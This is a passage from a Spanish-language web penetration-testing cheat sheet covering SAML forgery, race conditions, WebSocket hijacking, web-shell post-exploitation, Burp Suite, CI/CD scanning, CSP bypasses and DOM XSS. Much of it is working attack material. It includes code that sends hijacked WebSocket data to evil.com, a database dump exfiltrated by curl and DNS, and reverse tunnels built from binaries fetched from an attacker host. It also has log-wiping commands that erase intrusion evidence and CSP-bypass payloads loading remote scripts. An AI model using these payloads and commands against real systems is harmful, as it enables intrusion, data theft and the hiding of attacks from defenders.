  <saml:AttributeValue>admin</saml:AttributeValue>
</saml:Attribute>

<saml:Attribute Name="email">
  <saml:AttributeValue>attacker@evil.com</saml:AttributeValue>
</saml:Attribute>

# Cambiar el Subject
<saml:Subject>
  <saml:NameID>admin@target.com</saml:NameID>
</saml:Subject>
```

### Assertion Replay

```http
# Reutilizar una assertion valida
POST /[saml](../raw/hybr1d-1d3nt1ty.md#saml)/[sso](../raw/hybr1d-1d3nt1ty.md#sso)
SAMLResponse=BASE64_ENCODED_ASSERTION

# Si el server no valida:
# - timestamps (NotBefore, NotOnOrAfter)
# - Assertion ID unico
# - Session index

# Probar con la misma assertion multiples veces
for i in $(seq 1 10); do
    curl -X POST "http://target.com/SAML/SSO" -d "SAMLResponse=$ASSERTION"
done
```

### Audience Restriction Bypass

```xml
<!-- Modificar Audience para que apunte a otro servicio -->
<saml:Conditions>
  <saml:AudienceRestriction>
    <saml:Audience>https://victim.com</saml:Audience>
  </saml:AudienceRestriction>
</saml:Conditions>

# Cambiar a:
<saml:Audience>https://evil.com</saml:Audience>
<saml:Audience>https://victim.com/admin</saml:Audience>
<saml:Audience>*</saml:Audience>

# Eliminar AudienceRestriction completamente
<saml:Conditions>
</saml:Conditions>
```

### Issuer Spoofing

```xml
<!-- Falsificar el Issuer -->
<saml:Issuer>https://idp.victim.com</saml:Issuer>

# Si el SP no valida el Issuer, cualquier IdP sirve
# Crear tu propio IdP que emita assertions con Issuer falso

# Probar Issuers comunes
https://idp.target.com
https://sts.target.com
https://login.target.com
https://accounts.target.com
```

### AuthnRequest Manipulation

```xml
<!-- Forzar autenticacion debil -->
<samlp:AuthnRequest>
  <samlp:RequestedAuthnContext Comparison="minimum">
    <saml:AuthnContextClassRef>
      urn:oasis:names:tc:SAML:2.0:ac:classes:Password
    </saml:AuthnContextClassRef>
  </samlp:RequestedAuthnContext>
</samlp:AuthnRequest>

# Forzar sin MFA
# Cambiar PasswordProtectedTransport a solo Password

# ForceAuthn=false -> sin re-autenticacion
ForceAuthn="false"
```

### Session Fixation via SSO

```http
# El atacante establece un session ID antes del SSO
GET /app?sessionid=EVIL_SESSION

# Si el SSO mantiene el session ID despues del login
POST /SAML/SSO?sessionid=EVIL_SESSION
SAMLResponse=VALID

# Ahora el atacante conoce el session ID de la victima
```

### ADFS Authentication Bypass

```bash
# ADFS specific endpoints
/adfs/ls/idpinitiatedsignon.htm
/adfs/services/trust/2005/usernamemixed
/adfs/services/trust/2005/windowsmixed
/adfs/services/trust/13/usernamemixed

# ADFS SSRF
/adfs/services/trust/mex?wsdl

# ADFS signature verification bypass
# Algunas versiones viejas no verifican la firma si el XML tiene namespaces raros
```

### Okta Misconfigurations

```bash
# Okta tenant enumeration
https://target.okta.com
https://target-admin.okta.com

# Okta API keys en apps
# Okta session cookie: sid
# Okta IDP bypass

# Okta SSO sin MFA
# Okta universal logout bypass
# Okta delegated authentication bypass
```

### Azure AD Seamless SSO

```bash
# Azure AD endpoints
https://login.microsoftonline.com/{tenant}/saml2
https://login.microsoftonline.com/{tenant}/federation
https://login.microsoftonline.com/common/saml2

# Seamless SSO - Kerberos ticket
# El ticket se puede extraer del navegador
# Repetir el ticket para autenticarse como otro usuario

# Azure AD conditional access bypass
# Probar desde diferentes IPs, user-agents, devices
```

### SAMLRaider Workflow

```bash
# SAMLRaider - Burp extension
# Workflow completo:
# 1. Interceptar SAMLResponse
# 2. Send to SAMLRaider
# 3. Probar XSW (multiple variants)
# 4. Modificar atributos
# 5. Replay attack
# 6. Certificado falso
# 7. Signature stripping
# 8. Token tampering

# Herramientas adicionales
git clone https://github.com/OpenCVE/saml_burp_ext.git
# SAML Tool - https://www.samltool.com/
# saml-decoder
```

<a name="race"></a>
## 19. Race Conditions

### Race Condition Detection

```bash
# Turbo Intruder - parallel attack
# Python script para Turbo Intruder:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           engine=Engine.BURP2)
    for i in range(100):
        engine.queue(target.req)

# HTTP pipelining (HTTP/1.1)
# Mandar requests sin esperar respuestas

# Single-packet attack (HTTP/2)
# Enviar todo en un solo paquete TCP
# Los requests llegan al mismo tiempo al backend
```

### Race in Coupon/Cart/Payment Flows

```bash
# Cupon aplicado multiples veces
POST /cart/apply-coupon
{"code": "SAVE50"}

# Enviar 20 requests en paralelo
# Si no hay locking, el cupon se aplica 20 veces

# Pago con descuento aplicado en el ultimo momento
POST /checkout
{"coupon": "SAVE50", "total": 100}

# Race entre aplicar cupon y calcular total
# Aplicar cupon DESPUES de calcular total pero ANTES de confirmar
```

### Race in Account Creation

```bash
# Registrar mismo username en paralelo
POST /signup
{"username": "admin", "email": "a@a.com"}

POST /signup
{"username": "admin", "email": "b@b.com"}

# Si no hay unique constraint race:
# Dos usuarios con el mismo username creados exitosamente

# Race en email verification
# Verificar email antes de que el registro termine
```

### Race in File Upload

```bash
# Terminal 1: subir archivo
while true; do curl -F "file=@shell.php" http://target.com/upload; done

# Terminal 2: ejecutar archivo durante subida
while true; do curl http://target.com/uploads/shell.php?cmd=id; done

# El archivo se guarda temporalmente mientras se valida
# Si accedes antes de que lo borren, ejecutas codigo
```

### Race in Email Verification

```bash
# Cambiar email a uno verificado
POST /change-email
{"email": "verified@a.com"}

# Cambiar email DESPUES de enviar el verificacion
# pero ANTES de que el sistema procese el cambio

# Race window:
# 1. Solicitar cambio de email a attacker@evil.com
# 2. RAPIDO: solicitar cambio de email a verified@a.com
# 3. El sistema verifica attacker@evil.com pero el email actual es verified@a.com
```

### Race in Database State

```bash
# Ejemplo: transferring money
POST /transfer
{"from": "A", "to": "B", "amount": 100}

# Sin transaction isolation:
# SELECT balance FROM accounts WHERE id='A' -> 100
# SELECT balance FROM accounts WHERE id='A' -> 100 (otra request simultanea)
# UPDATE accounts SET balance=0 WHERE id='A'
# UPDATE accounts SET balance=0 WHERE id='A' (segunda)
# El balance queda en 0, pero el destinatario recibe 200

# Race en UPDATE counters
# UPDATE counters SET count = count + 1
# vs
# SELECT count FROM counters
# UPDATE counters SET count = new_value
```

<a name="websockets"></a>
## 20. WebSockets Security

### CSWSH - Cross-Site WebSocket Hijacking

```javascript
// Si el WebSocket solo verifica Origin (o ni eso)
var ws = new WebSocket('wss://target.com/chat');
ws.onopen = function() {
    ws.send('{"action":"get_messages"}');
};
ws.onmessage = function(e) {
    fetch('https://evil.com/steal?data=' + encodeURIComponent(e.data));
};

// Desde un sitio malicioso se puede:
// - Leer mensajes del usuario
// - Enviar mensajes como el usuario
// - Acceder a funcionalidades del websocket

// Bypass de verificacion de Origin:
// Origin: null (iframe sandbox)
// Origin: https://evil.com (si no verifican bien)
```

### WS Content Injection

```json
// Si el mensaje se refleja sin sanitizar
{"message": "<img src=x onerror=alert(1)>"}

// Inyeccion SQL
{"message": "1' OR '1'='1"}

// [command injection](../raw/w3b-h4ck1ng.md#command-injection)
{"command": "ping -c 1 127.0.0.1; id"}

// Path traversal
{"file": "../../../etc/passwd"}

// Inyeccion en JSON parse
{"message": "test", "__proto__": {"isAdmin": true}}
```

### WS Authentication Replay

```http
# Handshake inicial
GET /ws/chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Cookie: session=VALID_SESSION

# Si la autenticacion solo ocurre en el handshake
# Una vez establecido, el atacante puede reusar la conexion

# Probar si se puede conectar sin cookie
# Probar con cookie caducada
# Probar con cookie de otro usuario
```

### WS SQL Injection

```json
// En mensajes que se procesan como SQL
{"action": "search", "query": "1' OR '1'='1"}
{"action": "search", "query": "1 UNION SELECT 1,2,3"}

// Time-based via WebSocket
{"action": "search", "query": "1' AND SLEEP(5)--"}

// Blind SQLi
{"action": "get_user", "id": "1' AND SUBSTRING((SELECT password),1,1)='a'--"}
```

### WS DoS

```python
import asyncio, websockets

# Flood de mensajes
async def flood():
    async with websockets.connect('wss://target.com/ws') as ws:
        for i in range(10000):
            await ws.send('{"data": "A" * 100000}')
            await ws.recv()

# Slow loris en WebSocket
# Enviar headers parciales y nunca completar el handshake

# Deep JSON nesting
{"data": {"data": {"data": {"data": ... 1000 niveles deep }}}}

# Array de objetos masivos
{"data": [{"a": 1} * 100000]}
```

### WS MITM con mitmproxy

```python
# Script de mitmproxy para interceptar WebSockets
from mitmproxy import websocket

def websocket_message(flow):
    message = flow.messages[-1]
    print(f"[WS] {message.content}")
    
    # Modificar mensajes
    if b"password" in message.content:
        message.content = message.content.replace(b"password", b"hacked")

    # Inyectar mensajes
    if b"authenticated" in message.content:
        flow.inject_message(flow.direction, b'{"admin":true}')
```

### WS Tunneling

```bash
# Tunelizar trafico HTTP sobre WebSocket
# Mitigacion de firewalls que bloquean HTTP pero no WS

# Herramientas:
# websocat
echo '{"test": 1}' | websocat wss://target.com/ws

# wscat
wscat -c wss://target.com/ws

# Python websockets
asyncio.run(websockets.connect('wss://target.com/ws'))
```

### WS Protocol Downgrade

```bash
# Forzar ws:// en lugar de wss://
# Si el server tambien acepta ws://
var ws = new WebSocket('ws://target.com/ws');  # sin [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)

# HTTP -> WS downgrade
# Si el proxy solo valida HTTP pero no WS
# Mandar request malicioso via WS

# Origin bypass via protocol downgrade
# ws:// no verifica Origin (depende del server)
```

### WS Origin Verification Bypass

```bash
# Origin null (iframe)
<iframe sandbox="allow-scripts" src="data:text/html,<script>var ws=new WebSocket('wss://target.com/ws');ws.onopen=function(){ws.send('malicious')}</script>">

# Origin con subdominio
# Registrar subdominio en plataforma gratuita
# Origin: https://evil.target.com (si aceptan subdominios)

# Origin: https://target.com.evil.com

# No Origin header (algunos servidores no lo requieren)
```

<a name="postexplotacion"></a>
## 21. Post-Exploitation Web

### Web Shells Comparison

```bash
# weevely - PHP, modular, cifrado
weevely generate password shell.php
weevely http://target.com/shell.php password
weevely http://target.com/shell.php password :audit_php_ini
:system("whoami")
:audit_filesystem
:audit_php_ini
:enum_users
:file_download config.php
:file_upload local.txt remote.txt

# b374k - PHP, interfaz grafica, muchos modulos
# Incluye: file manager, command exec, DB browser, network tools

# p0wny - PHP, single-file, minimalista
# Solo lo basico: shell, file manager, upload/download

# antSword - Cliente desktop multiplataforma
# Conecta a shells PHP, ASP, JSP, Custom
# Plugin: database manager, port scanner, payload generator

# Behinder - "Skynet" version, cifrado y protocolo custom
# Compatible con WAF evasion por defecto

# Godzilla - Similar a Behinder, mas moderno
# Payloads: PHP, ASP, JSP, Python
# Protocolo: AES + Base64 + XOR + Raw
```

### WAF Evasion para Webshell Traffic

```bash
# Godzilla - payloads cifrados por AES
# El trafico parece aleatorio

# Behinder - protocolo binario custom
# No parece HTTP normal

# Custom encoding
curl -X POST http://target.com/shell.php \
  -H "Content-Type: text/plain" \
  --data-binary @encrypted_payload.bin

# Evasion via headers custom
X-Real-IP: 127.0.0.1
Accept-Language: en-US,en;q=0.9

# Traffic pattern evasion
# Random delays entre comandos
# User-Agent rotator
# Referer random
```

### Database Pivot desde Webshell

```bash
# MySQL desde webshell
mysql -u root -p'password' -e "SELECT * FROM users"
mysqldump -u root -p'password' --all-databases > dump.sql

# PostgreSQL
psql -U postgres -c "\\l"
psql -U postgres -c "SELECT * FROM pg_shadow"

# MSSQL
sqlcmd -S . -U sa -P 'password' -Q "SELECT * FROM sys.databases"

# Redis
redis-cli -h 127.0.0.1 KEYS "*"
redis-cli -h 127.0.0.1 GET "flag"

# Exportar datos via webshell
# Subir a servidor remoto
curl -X POST http://evil.com/exfil -d @dump.sql
# O exfiltrar por DNS registros
cat dump.sql | while read line; do nslookup "$line".exfil.evil.com; done
```

### Tunnel Traffic Through Webshell

```bash
# Neo-reGeorg - tunnel HTTP sobre webshell
python3 neoreg.py generate -k password
# Upload tunnel.php to server
python3 neoreg.py -k password -u http://target.com/tunnel.php
# Now use SOCKS proxy
# proxychains nmap -sT -Pn internal.target.com 3306

# Chisel through webshell
# Server side (your machine)
[chisel](../raw/l1n9x-pr1v3sc.md#chisel) server -p 8000 --reverse

# Client side (on target via webshell)
wget http://evil.com/chisel -O /tmp/chisel
[chmod](../raw/0s-f0nd4m3nt0s.md#permisos) +x /tmp/chisel
/tmp/chisel client http://evil.com:8000 R:socks

# Reverse SSH through webshell
# On target:
ssh -R 8000:localhost:22 evil@evil.com

# Or via dropbear (static binary)
wget http://evil.com/dropbear -O /tmp/db
chmod +x /tmp/db
/tmp/db -R 2222:localhost:22 evil.com
```

### Log Cleaning on Web Servers

```bash
# Apache access log
sed -i '/evil/d' /var/log/apache2/access.log
sed -i '/shell/d' /var/log/apache2/access.log
sed -i '/cmd/d' /var/log/apache2/access.log

# Apache error log
sed -i '/our_ip/d' /var/log/apache2/error.log

# Nginx
sed -i '/php_shell/d' /var/log/nginx/access.log

# Auth log
sed -i '/Failed password/d' /var/log/auth.log
sed -i '/Accepted password/d' /var/log/auth.log

# Last log
sed -i '/whoami/d' /var/log/lastlog

# History
history -c
rm ~/.bash_history
ln -s /dev/null ~/.bash_history

# Syslog
sed -i '/attacker/d' /var/log/syslog

# Eliminar todo evidencia de un archivo
shred -zu shell.php
shred -zu /tmp/[exploit](../raw/m3t4spl01t.md#exploits)
```

<a name="burp"></a>
## 22. Burp Suite Completo

### Burp Proxy - Configuracion Profunda

```bash
# Proxy basico en 127.0.0.1:8080
# Interceptar requests y modificarlos en tiempo real

# Match and Replace (Proxy -> Options -> Match and Replace)
# Reemplazar automaticamente:
# User-Agent: -> User-Agent: Mozilla/5.0 (test)
# Referer: -> Referer: https://www.google.com
# Remove: If-Modified-Since

# TLS Pass Through
# Proxy -> Options -> TLS Pass Through -> Add *.target.com

# Intercept Client Requests / Server Responses
# Solo interceptar si match ciertos filtros:
# - File extension: .php .asp .aspx
# - Request with parameters
# - Specific MIME types

# Response modification
# Deshabilitar Javascript en respuestas
# Reemplazar CSP headers para testear XSS

# WebSocket interception
# Proxy -> Options -> WebSockets
```

### Burp Repeater - Session Handling

```bash
# Repeater basico
# Enviar request, modificar, reenviar

# Session Handling Rules
# Repeater -> Session Handling Rules -> Add
# Rule Description: "Auto-refresh session"
# Scope: tools scope (Repeater, Intruder, Scanner)
# Action: "Check session is valid"
# Action: "If invalid, login again"
# Action: "Apply cookie"

# Macro Recording
# Project Options -> Sessions -> Macros -> Add
# Grabar: GET /login -> POST /login (user,pass) -> GET /dashboard

# Cookie Jar
# Project Options -> Sessions -> Cookie Jar
# Burp mantiene cookies automaticamente

# Repeater con autorizacion
# Enviar request como user A, user B, user C
# Comparar respuestas para IDOR
```

### Burp Intruder - Tipos de Ataque

```bash
# Sniper - un payload, posiciones multiples
# POST /api/user?role=ADMIN
# {"id": §1§}
# Payloads: admin, user, moderator
# Pruebas: admin,1 - admin,2 - user,1 - user,2 - ...

# Battering Ram - mismo payload en todas las posiciones
# POST /api/user?role=ADMIN
# {"id": ADMIN}
# Todas las posiciones reciben el mismo valor

# Pitchfork - multiple payload sets (uno a uno)
# Set 1: admin, root, test
# Set 2: admin123, root123, test123
# Pruebas: admin:admin123, root:root123, test:test123

# Cluster Bomb - todas las combinaciones
# Set 1: admin, root (2)
# Set 2: 1234, password (2)
# Pruebas: 2x2 = 4 combinaciones
```

### Intruder - Payload Processing

```bash
# Payload processing pipeline
# raw_payload -> encode -> prefix -> suffix

# Procesadores:
# Add prefix: "Bearer "
# Add suffix: "=="
# Encode: URL-encode, Base64-encode, HTML-encode
# Decode: URL-decode, Base64-decode
# Hash: SHA-256, MD5
# Case: upper, lower
# Grep - Extract: extraer datos de la respuesta
# Grep - Match: buscar patrones

# Ejemplo JWT fuzzing
# Payload: {"user":"admin"}
# Base64-encode
# Add prefix: "eyJhbGciOiJub25lIn0."
# Add suffix: ".sig"

# Hackvert - etiquetas personalizadas
# <@urlencode>payload</@urlencode>
# <@base64>data</@base64>
# <@sha256>password</@sha256>
```

### Burp Sequencer - Token Analysis

```bash
# Analisis de tokens:
# - Session IDs (PHPSESSID, JSESSIONID)
# - CSRF tokens
# - OAuth state parameters
# - JWT IDs (jti)
# - Nonces
# - Reset password tokens

# Workflow:
# 1. Enviar request al Sequencer
# 2. Capturar 20000+ tokens
# 3. Analizar:
#    - Entropia efectiva
#    - FIPS 140-2 tests
#    - Character-level analysis
#    - Bit-level analysis
# 4. Predecir proximos tokens

# Resultados:
# - Effective entropy < 32 bits -> predecible
# - FIPS tests fail -> PRNG debil
```

### Burp Decoder

```bash
# Decodificacion:
# URL: %20 -> espacio
# HTML: &lt; -> <
# Base64: YWxh -> ala
# ASCII hex: 686578 -> hex
# Octal: 150145170 -> hex
# Binary: 01101000 -> h
# GZIP: descomprimir
# JWT: decodificar header/payload

# Codificacion:
# URL encode, HTML encode, Base64, Hex, ASCII
# Smart decode: Burp detecta formato automaticamente

# Hashing:
# MD5, SHA-1, SHA-256, SHA-384, SHA-512
# HMAC-SHA256, HMAC-SHA1
```

### Burp Comparer - HTTP Diffs

```bash
# Comparar responses
# Request 1: /api/users/1 (admin, 200)
# Request 2: /api/users/2 (user, 200 pero diff data)
# Comparer muestra diferencias

# Para detectar:
# - IDOR (diff en datos)
# - Blind SQLi (true vs false)
# - Rate limiting (primer vs request 100)
# - WAF detections (con/sin payload)

# Modos: Words, Bytes, Lines
```

### Burp Extender - Extensiones

```bash
# Jython (Python para Burp)
# Extender -> Options -> Python Environment -> Jython JAR
# Extender -> Extensions -> Add

# Extensiones esenciales:
# - ActiveScan++: mejora scanner
# - Autorize: autorizacion automatico
# - Backslash Powered Scanner
# - Collaborator Everywhere
# - CO2: SQL console
# - Flow: mejor visibilidad
# - GraphQL Raider
# - HTTP Request Smuggler
# - InQL: GraphQL introspection
# - JS Miner: endpoints de JS
# - JSON Web Tokens
# - Logger++
# - Param Miner
# - SAMLRaider
# - Turbo Intruder
# - Upload Scanner

# Custom extension Java template:
# public class BurpExtender implements IBurpExtender, IScannerCheck {
#     public void registerExtenderCallbacks(IBurpExtenderCallbacks cb) {
#         cb.setExtensionName("Custom");
#         cb.registerScannerCheck(this);
#     }
# }
```

### Session Handling Rules

```bash
# Project Options -> Sessions -> Session Handling Rules

# Regla 1: Login automatizado
# Scope: Intruder, Scanner
# Check: Si response contiene "login"
# Action: Macro "login_macro"
# Action: Update cookies

# Regla 2: CSRF token renewal
# Scope: Repeater
# Check: Si request tiene CSRF token
# Action: Run macro for new token
# Action: Set CSRF token

# Regla 3: OAuth refresh
# Scope: All tools
# Check: Si response es 401
# Action: Run macro to refresh token
# Action: Retry request

# Regla 4: IP rotation
# Check: Cada N requests
# Action: Change X-Forwarded-For
```

### Burp Collaborator Client

```bash
# Collaborator - OOB testing
# URL: xxxxxx.burpcollaborator.net

# Probar:
# - SSRF: http://xxxxx.burpcollaborator.net
# - Blind XSS: <img src=http://xxxxx.burpcollaborator.net/x>
# - Blind SQLi: LOAD_FILE('\\\\xxxxx.burpcollaborator.net\\test')
# - XXE: <!ENTITY xxe SYSTEM "http://xxxxx.burpcollaborator.net/xxe">
# - Command injection: nslookup xxxxx.burpcollaborator.net
# - CRLF injection: Host: xxxxx.burpcollaborator.net

# Collaborator Everywhere extension
# Inyecta en headers:
# - X-Forwarded-Host
# - X-Forwarded-For
# - Referer
# - Origin
# - Host
# - Cookie
```

### Burp REST API y Headless (CI/CD)

```bash
# REST API (Burp Professional)
java -jar burpsuite_pro.jar --rest-api --collaborator-server

# Endpoints:
GET /api/v0/targets
GET /api/v0/issues
POST /api/v0/scan

# Headless CI/CD:
java -jar burpsuite_pro.jar \
  --project-file=target.burp \
  --config-file=burp-config.json \
  --rest-api

curl -X POST http://127.0.0.1:1337/api/v0/scan \
  -H "Content-Type: application/json" \
  -d '{"urls": ["http://target.com"]}'
```

<a name="cicd"></a>
## 23. CI/CD Pipeline Security

### ZAP en CI/CD

```bash
# ZAP Full Scan
[docker](../raw/d0ck3r-f0r-h4ck3rs.md) run -v $(pwd):/zap/wrk/:rw -t zaproxy/zap-stable \
  zap-full-scan.py \
  -t http://target.com \
  -r testreport.html \
  -l PASS

# ZAP API Scan
docker run -t zaproxy/zap-stable \
  zap-api-scan.py \
  -t http://target.com/openapi.json \
  -f openapi \
  -r api_report.html

# ZAP con autenticacion
docker run -t zaproxy/zap-stable \
  zap-full-scan.py \
  -t http://target.com \
  -u "user@target.com" \
  -P "password123" \
  -r report.html

# ZAP en GitHub Actions
# .github/workflows/zap.yml
# ---
# name: ZAP Scan
# on: [push]
# jobs:
#   zap:
#     runs-on: ubuntu-latest
#     steps:
#       - uses: actions/checkout@v3
#       - name: ZAP Scan
#         uses: zaproxy/action-full-scan@v0.7.0
#         with:
#           target: 'http://target.com'
# ---
```

### Nuclei en GitHub Actions/GitLab CI

```bash
# GitHub Actions
# .github/workflows/nuclei.yml
# ---
# name: Nuclei Scan
# on:
#   schedule:
#     - cron: '0 0 * * *'
# jobs:
#   scan:
#     runs-on: ubuntu-latest
#     steps:
#       - uses: actions/checkout@v3
#       - name: Install Nuclei
#         run: |
#           wget https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_linux_amd64.zip
#           unzip nuclei_linux_amd64.zip
#           sudo mv nuclei /usr/local/bin/
#       - name: Run Nuclei
#         run: nuclei -u http://target.com -severity critical,high -json -o results.json
#       - name: Upload Results
#         uses: actions/upload-artifact@v3
#         with:
#           name: nuclei-results
#           path: results.json
# ---

# GitLab CI
# .gitlab-ci.yml
# ---
# nuclei-scan:
#   image: golang:1.20
#   script:
#     - wget https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_linux_amd64.zip
#     - unzip nuclei_linux_amd64.zip
#     - ./nuclei -u http://target.com -severity critical,high -json -o results.json
#   artifacts:
#     paths:
#       - results.json
# ---
```

### Nikto en Pipelines

```bash
docker run -t sullo/nikto -h http://target.com -ssl -o report.html
docker run -t sullo/nikto -h http://target.com -id "admin:password"
docker run -t sullo/nikto -h http://target.com -Format xml -o report.xml
```

### Custom Python Scanners

```python
import requests, sys, json

def check_headers(url):
    issues = []
    r = requests.get(url)
    headers = {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000',
        'Content-Security-Policy': None,
    }
    for h, expected in headers.items():
        if h not in r.headers:
            issues.append(f"MISSING: {h}")
        elif expected and r.headers[h] != expected:
            issues.append(f"WEAK: {h}: {r.headers[h]}")
    return issues

def check_path_traversal(url):
    payloads = ['../etc/passwd']
    for p in payloads:
        r = requests.get(f"{url}/{p}", timeout=5)
        if 'root:' in r.text:
            return [f"Path traversal: {p}"]
    return []

if __name__ == '__main__':
    url = sys.argv[1]
    issues = check_headers(url) + check_path_traversal(url)
    print(json.dumps(issues, indent=2))
    if len(issues) > 5:
        sys.exit(1)
```

### DAST vs SAST vs IAST vs RASP

```bash
# SAST - Static Analysis (codigo fuente)
# Semgrep
semgrep --config=auto src/
semgrep --config=p/python src/

# SonarQube
sonar-scanner \
  -Dsonar.projectKey=myproject \
  -Dsonar.sources=. \
  -Dsonar.host.url=http://localhost:9000

# CodeQL
codeql database create mydb --language=javascript
codeql database analyze mydb --format=sarif-latest --output=results.sarif

# Checkmarx
runCxConsole scan -CxServer server -Project project -Location src/

# DAST - OWASP ZAP, Burp, Nikto, Nuclei
# IAST - Contrast, Hdiv (instrumentacion en runtime)
# RASP - Signal Sciences, Sqreen (proteccion en runtime)
```

### Automated Crawling + Scanning

```bash
# Pipeline completo: Crawl -> Scan -> Report -> Fail/Pass

# Crawl con ZAP
zap-cli quick-scan http://target.com

# Crawl con Python + ZAP API
python -c "
from zapv2 import ZAPv2
zap = ZAPv2(apikey='key', proxies={'http': 'http://127.0.0.1:8080'})
zap.spider.scan('http://target.com')
print(zap.spider.status())
"
```

<a name="csp"></a>
## 24. CSP - Content Security Policy Bypass

### CSP Evaluation Tooling

```bash
# CSP Evaluator (Google)
# https://csp-evaluator.withgoogle.com/

# CSP Scanner
# Burp extension: CSP Scanner
# Analiza headers CSP y busca bypasses

# csp-validator
npm install -g csp-validator
csp-validator "script-src 'self' https://cdn.example.com"

# Detect CSP header
curl -I http://target.com | grep -i content-security-policy

# Buscar report-uri
curl -I http://target.com | grep -i report-uri
curl -I http://target.com | grep -i report-to
```

### script-src Bypass - CDN Whitelist

```html
<!-- Si jQuery está whitelisted en CDN -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script>
$.getScript('https://evil.com/payload.js');
</script>

<!-- Angular + JSONP -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
<script>
angular.element(document).ready(function() {
    angular.module('app', []).run(['$http', function($http) {
        $http.jsonp('https://evil.com/exploit?callback=JSON_CALLBACK');
    }]);
});
</script>

<!-- Prototype.js -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js"></script>
<script>
new Ajax.Request('https://evil.com/exploit', {method:'get'});
</script>

<!-- YUI (Yahoo! UI) -->
<script src="https://yui-sandbox.yahooapis.com/3.18.1/build/yui/yui-min.js"></script>
<script>
YUI().use('io-base', function(Y) {
    Y.io('https://evil.com/exploit');
});
</script>
```

### script-src Bypass - JSONP Endpoints

```html
<!-- Google APIs JSONP -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<!-- YouTube JSONP -->
<script src="https://www.youtube.com/oembed?url=http://youtube.com&format=json&callback=alert(1)"></script>

<!-- Facebook JSONP -->
<script src="https://graph.facebook.com/me?callback=alert(1)"></script>

<!-- Twitter JSONP -->
<script src="https://api.twitter.com/1/statuses/user_timeline.json?callback=alert(1)"></script>

<!-- GitHub JSONP -->
<script src="https://api.github.com/?callback=alert(1)"></script>

<!-- LinkedIn JSONP -->
<script src="https://api.linkedin.com/v1/people/~?callback=alert(1)"></script>
```

### script-src Bypass - Angular (1.x) Sandbox Escape

```html
<!-- CSP con Angular -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
<!-- CSP: script-src 'self' https://ajax.googleapis.com -->

<div ng-app ng-csp>
  <input autofocus ng-focus="x=''">
  <div><!--{{x.constructor.constructor('alert(1)')()}}--></div>
</div>

<!-- Angular sandbox escape (1.6+) -->
<div ng-app>
  {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}}
</div>
```

### script-src Bypass - googleapis

```html
<!-- Google Hosted Libraries -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>

<!-- Google Maps API -->
<script src="https://maps.googleapis.com/maps/api/js?callback=alert(1)"></script>

<!-- Google Recaptcha API -->
<script src="https://www.google.com/recaptcha/api.js?onload=alert(1)&render=explicit"></script>
```

### style-src Bypass

```html
<!-- Si style-src permite 'unsafe-inline' -->
<style>
body { background-image: url('javascript:alert(1)'); }
</style>

<!-- Si style-src permite un CDN -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/evil/1.0/evil.css">

<!-- CSS injection con exfiltracion -->
<style>
input[value^="a"] { background: url('https://evil.com/char?a'); }
input[value^="b"] { background: url('https://evil.com/char?b'); }
</style>
```

### img-src Bypass - Data Exfiltration

```html
<!-- Si img-src permite cualquier dominio -->
<img src="https://evil.com/steal?data=secret">
<img src="http://evil.com/steal?cookie=COOKIE">

<!-- Si img-src es 'self', probar data: -->
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">

<!-- DNS exfiltracion via img -->
<img src="http://secret.evil.com/test">
```

### Nonce/Random Bypass

```html
<!-- Si el nonce se reusa (nonce fijo) -->
<script nonce="abc123">alert(1)</script>
<script nonce="abc123">fetch('https://evil.com/steal')</script>

<!-- Si el nonce se puede leakear via CSS -->
<style>
script[nonce^="a"] { background: url('https://evil.com/nonce?a'); }
script[nonce^="b"] { background: url('https://evil.com/nonce?b'); }
</style>

<!-- Leak via script.src reflection -->
<!-- Si hay un endpoint que refleja el script en respuesta -->
```

### strict-dynamic Bypass

```html
<!-- CSP: script-src 'strict-dynamic' 'nonce-random' -->

<!-- 'strict-dynamic' permite que scripts cargados por scripts confiables tambien corran -->
<script nonce="random">
var s = document.createElement('script');
s.src = 'https://evil.com/payload.js';
document.body.appendChild(s);  // Permitido!
</script>

<!-- strict-dynamic bypass via import() -->
<script nonce="random">
import('https://evil.com/payload.js');
</script>
```

### CSP Violation Reporting Abuse

```bash
# El report-uri recibe data de violaciones
# Pero tambien puede ser usado para exfiltrar datos

# CSP report endpoint:
Content-Security-Policy: ...; report-uri https://target.com/csp-report

# Datos en el report:
{
  "csp-report": {
    "document-uri": "https://target.com/page?secret=123",
    "referrer": "https://target.com/other",
    "violated-directive": "script-src-elem",
    "effective-directive": "script-src-elem"
  }
}

# El report puede leakear data de la URL
```

<a name="dom"></a>
## 25. DOM-Based Vulnerabilities

### DOM XSS

```javascript
// DOM XSS en innerHTML
document.getElementById('output').innerHTML = location.[hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions).substring(1);

// DOM XSS en document.write
document.write('<script>' + location.search.substring(1) + '</script>');

// DOM XSS en eval
eval(location.hash.substring(1));

// DOM XSS en setTimeout (string)
setTimeout(location.hash.substring(1), 100);

// DOM XSS en Function constructor
new Function(location.hash.substring(1))();

// DOM XSS en script.src
var script = document.createElement('script');
script.src = location.hash.substring(1);
document.body.appendChild(script);

// DOM XSS en location
location.href = location.hash.substring(1);

// DOM XSS en srcdoc
iframe.srcdoc = location.hash.substring(1);

// Sinks peligrosos:
// - document.write()
// - element.innerHTML
// - element.outerHTML
// - element.insertAdjacentHTML()
// - eval(), setTimeout(), setInterval()
// - new Function()
// - script.src, link.href
// - location, location.href

// Sources:
